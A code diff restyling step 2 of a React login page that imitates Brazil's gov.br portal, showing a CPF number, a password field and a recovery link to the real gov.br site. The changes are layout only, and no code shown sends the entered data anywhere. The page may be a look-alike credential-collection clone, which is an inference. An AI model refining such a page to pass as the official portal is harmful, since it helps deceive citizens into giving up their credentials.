@@ -198,21 +198,17 @@ export default function LoginPage() {
             {step === 2 && (
               <div className="gov-step2-form" style={{width: '100%'}}>
                 <h3 className="gov-card-title">Digite sua senha</h3>
-                <div className="gov-user-info">
-                  <span style={{fontSize: '14px', color: '#666'}}>Você está acessando como:</span>
-                  <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '8px'}}>
-                    <h4 className="gov-cpf-display">{cpf}</h4>
-                    <button onClick={() => setStep(1)} style={{background: 'none', border: 'none', color: '#1351b4', cursor: 'pointer', fontSize: '14px', fontWeight: '500'}}>Alterar CPF</button>
-                  </div>
-                </div>
+                <label className="gov-label" style={{marginBottom: '4px'}}>CPF</label>
+                <h4 className="gov-cpf-display" style={{fontSize: '18px', fontWeight: '600', margin: '0 0 20px 0', color: '#333'}}>{cpf}</h4>
                 
                 <div style={{marginBottom: '24px'}}>
-                  <label className="gov-label">Senha</label>
+                  <label className="gov-label" htmlFor="password" style={{marginBottom: '8px'}}>Senha</label>
                   <div style={{position: 'relative'}}>
                     <input 
+                      id="password"
                       type={showPassword ? "text" : "password"} 
                       className="gov-input" 
-                      placeholder="Digite sua senha"
+                      placeholder="Digite sua senha atual"
                       value={password}
                       onChange={(e) => { setPassword(e.target.value); setErrorMsg(''); }}
                       onKeyPress={handleKeyPressPassword}
@@ -233,18 +229,20 @@ export default function LoginPage() {
                       <i className="fa-solid fa-circle-exclamation" style={{marginRight: 4}}></i> {errorMsg}
                     </div>
                   )}
-                  <button className="gov-forgot-link" onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}>Esqueci minha senha</button>
                 </div>
 
-                <div className="gov-button-panel-between">
-                  <button className="gov-btn-outline" onClick={handleCancel}>Cancelar</button>
-                  <button 
-                    className={`gov-btn-primary ${isLoading ? 'gov-btn-loading' : ''}`}
-                    onClick={handleLogin}
-                    disabled={isLoading}
-                  >
-                    {isLoading ? '' : 'Entrar'}
-                  </button>
+                <div className="gov-actions-column" style={{marginTop: '0'}}>
+                  <div className="gov-button-panel-between" style={{display: 'flex', justifyContent: 'space-between', gap: '0.5rem', margin: '2rem 0 1rem 0'}}>
+                    <button className="gov-btn-outline" type="button" onClick={handleCancel}>Cancelar</button>
+                    <button 
+                      className={`gov-btn-primary ${isLoading ? 'gov-btn-loading' : ''}`}
+                      onClick={handleLogin}
+                      disabled={isLoading}
+                    >
+                      {isLoading ? '' : 'Entrar'}
+                    </button>
+                  </div>
+                  <button className="gov-forgot-link" style={{marginTop: '0rem', marginBottom: '1rem', background: 'none', border: 'none', boxShadow: 'none', padding: '0', color: '#1351b4', fontWeight: '500', cursor: 'pointer', width: '100%', textAlign: 'center'}} onClick={() => window.location.href = 'https://sso.acesso.gov.br/account-recovery'}>Esqueci minha senha</button>
                 </div>
               </div>
             )}
